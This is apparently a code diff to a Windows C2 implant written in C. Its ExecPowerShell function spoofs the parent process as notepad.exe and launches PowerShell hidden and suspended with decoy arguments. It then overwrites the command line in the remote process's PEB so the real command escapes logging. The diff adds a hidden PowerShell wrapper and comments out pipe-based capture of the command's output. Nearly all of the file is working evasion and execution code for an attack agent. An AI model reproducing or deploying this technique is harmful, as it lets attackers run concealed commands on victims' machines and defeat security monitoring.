@@ -41,17 +41,34 @@ BOOL WriteToTargetProcess(IN HANDLE hProcess, IN PVOID pAddressToWriteTo, IN PVO
 }
 
 LPSTR ExecPowerShell(LPCWSTR psCommand) {
-    HANDLE hRead = NULL, hWrite = NULL;
-    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
     STARTUPINFOEXW SiEx = { 0 };
-    SiEx.StartupInfo.cb = sizeof(STARTUPINFOEXA);
+    SiEx.StartupInfo.cb = sizeof(STARTUPINFOEXW);
 	PROCESS_INFORMATION Pi = { 0 };
+    WCHAR wrappedPsCmd[4096];
 
     printf("[*] Executing C2 command : %ls\n", psCommand);
 
-    printf("[*] Creating Pipe (stdout/stdin)\n");
-    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) return NULL;
-    SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0); //Only current and child inherit handles
+/*    
+    WCHAR pipeName[128];
+    wsprintfW(pipeName, L"\\\\.\\pipe\\rzdhop_npipe_%lu", GetTickCount());
+    printf("[*] Creating Named Pipe : '%ls'\n", pipeName);
+*/
+    //HANDLE hPipe = CreateNamedPipeW(pipeName, PIPE_ACCESS_INBOUND, PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, 1, 4096, 4096, 0, NULL);
+    wsprintfW(
+        wrappedPsCmd,
+        L"powershell.exe -NoProfile -WindowStyle Hidden -Command "
+        L"\""
+        L"`$o = (& { %ls } | Out-String); ",
+        //L"`$pipe = New-Object System.IO.Pipes.NamedPipeClientStream('.', '%ls', [System.IO.Pipes.PipeDirection]::Out); " 
+        //L"`$pipe.Connect(); " //Connect to named pipe
+        //L"`$b = [System.Text.Encoding]::UTF8.GetBytes(`$o); "
+        //L"`$pipe.Write(`$b,0,`$b.Length); " //write in named pipe
+        //L"`$pipe.Flush(); "
+        //L"`$pipe.Close()"
+        //L"\"",
+        psCommand
+        //pipeName + 9 // saute "\\.\pipe\"
+    );
 
     printf("[*] Spoofing PPID of Notepad.exe\n");
     DWORD  PID     = 0;
@@ -66,13 +83,7 @@ LPSTR ExecPowerShell(LPCWSTR psCommand) {
     InitializeProcThreadAttributeList(pThreadAttList, 1, 0, &sThreadAttList); // Get Threat attibutes structure
     UpdateProcThreadAttribute(pThreadAttList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL);
     SiEx.lpAttributeList = pThreadAttList;
-    printf("[*] STARTUPINFOEXA structure updated : lpAttributeList::PROC_THREAD_ATTRIBUTE_PARENT_PROCESS <- Notion.exe (PID: %d)\n", PID);
-    
-    SiEx.StartupInfo.dwFlags |= STARTF_USESTDHANDLES;
-    SiEx.StartupInfo.hStdOutput = hWrite;
-    SiEx.StartupInfo.hStdError  = hWrite;
-    SiEx.StartupInfo.hStdInput  = NULL;
-    printf("[*] STARTUPINFOEXA structure updated : Attached a stdin/stdout pipe\n");
+    printf("[*] STARTUPINFOEXW structure updated : lpAttributeList::PROC_THREAD_ATTRIBUTE_PARENT_PROCESS <- Notepad.exe (PID: %d)\n", PID);
     
     printf("[*] Starting process with Fake PPID & Fake arguments (RickRoll)\n");
     WCHAR fakeStartupArgs[] = L"powershell.exe -NoProfile -WindowStyle Hidden -Command \"Start-Process 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'\"";
@@ -91,7 +102,7 @@ LPSTR ExecPowerShell(LPCWSTR psCommand) {
 		return FALSE;
 	}
     printf("[*] Process Created with 'EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED | CREATE_NO_WINDOW' flags\n");
-    printf("[*] Update process argument with the effective one : %ls\n", psCommand);
+    printf("[*] Update process argument with the effective one : %ls\n", wrappedPsCmd);
     printf("[*] Getting remote process's PROCESS_BASIC_INFORMATION to get it's PEB (PBI::PebBaseAddress)\n");
     _NtQueryInformationProcess pNtQueryInformationProcess = (_NtQueryInformationProcess)GetProcAddress(CustomGetModuleHandleW(L"ntdll.dll"), "NtQueryInformationProcess");
     
@@ -106,12 +117,12 @@ LPSTR ExecPowerShell(LPCWSTR psCommand) {
     printf("[*] Getting RTL_USER_PROCESS_PARAMETERS strucutre from PEB to edit the calling argument/parameter\n");
     SIZE_T parmsReadSize = sizeof(RTL_USER_PROCESS_PARAMETERS) + 0xff; //Lit un peu plus pour eviter de multiplier les lectures dans le remote process
     ReadFromTargetProcess(Pi.hProcess, pPeb->ProcessParameters, (PVOID*)&pParms, parmsReadSize);
-    SIZE_T effectiveArgs_sz  = lstrlenW(psCommand) + 1; 
+    SIZE_T effectiveArgs_sz  = lstrlenW(wrappedPsCmd) + 1; 
     SIZE_T effectiveArgs_bsz = effectiveArgs_sz * sizeof(WCHAR); //taille en Bytes pour écrire en mode "RAW" Bytes
     PWSTR remoteCmdBuffer = pParms->CommandLine.Buffer; // ADDR du buffer dans le remote process
 
     printf("[*] Updating CommandLine.Buffer in PEB::ProcessParameters\n");
-    WriteToTargetProcess(Pi.hProcess, (PVOID)remoteCmdBuffer, (PVOID)psCommand, effectiveArgs_bsz);
+    WriteToTargetProcess(Pi.hProcess, (PVOID)remoteCmdBuffer, (PVOID)wrappedPsCmd, effectiveArgs_bsz);
 
     printf("[*] Updating Commandline.Length in PEB::ProcessParameters\n");
     USHORT effectiveArgs_sz_us = (USHORT)(effectiveArgs_bsz & 0xFFFF); //Byte size as USHORT (4octets)
@@ -124,27 +135,34 @@ LPSTR ExecPowerShell(LPCWSTR psCommand) {
     WriteToTargetProcess(Pi.hProcess, remoteCmdMaxLenAddr, (PVOID)&maxlen, sizeof(USHORT));
 
     printf("[*] Process manipulation done, resuming thread...\n");
-    Sleep(2);
     ResumeThread(Pi.hThread);
-    CloseHandle(hWrite); //Send an EOF to the pipe
+    Sleep(2);
+    //ConnectNamedPipe(hPipe, NULL);
 
-    CHAR pipeChunkBuffer[4096];
-    DWORD bytesRead = 0;
-    SIZE_T outputSize = 0;
+    //CHAR pipeChunkBuffer[4096];
+    //DWORD bytesRead = 0;
+    //SIZE_T outputSize = 0;
     LPSTR outputBuffer = calloc(1, 1); //will be reallocated at each bytes read
-
-    while (ReadFile(hRead, pipeChunkBuffer, sizeof(pipeChunkBuffer) - 1, &bytesRead, NULL) && bytesRead) {
-        pipeChunkBuffer[bytesRead] = 0;
-        outputBuffer = realloc(outputBuffer, outputSize + bytesRead + 1);
-        memcpy(outputBuffer + outputSize, pipeChunkBuffer, bytesRead);
-        outputSize += bytesRead;
-    }
-
+//
+    //while (ReadFile(hPipe, pipeChunkBuffer, sizeof(pipeChunkBuffer) - 1, &bytesRead, NULL) && bytesRead) {
+    //    pipeChunkBuffer[bytesRead] = 0;
+    //    outputBuffer = realloc(outputBuffer, outputSize + bytesRead + 1);
+    //    memcpy(outputBuffer + outputSize, pipeChunkBuffer, bytesRead);
+    //    outputSize += bytesRead;
+    //}
     WaitForSingleObject(Pi.hProcess, INFINITE);
+
+    //DisconnectNamedPipe(hPipe);
+    //CloseHandle(hPipe);
+    
+    CloseHandle(Pi.hThread);
+    CloseHandle(Pi.hProcess);
     
     free(pPeb);
     free(pParms);
+    
     DeleteProcThreadAttributeList(pThreadAttList);
     free(pThreadAttList);
+    
     return outputBuffer;
 }
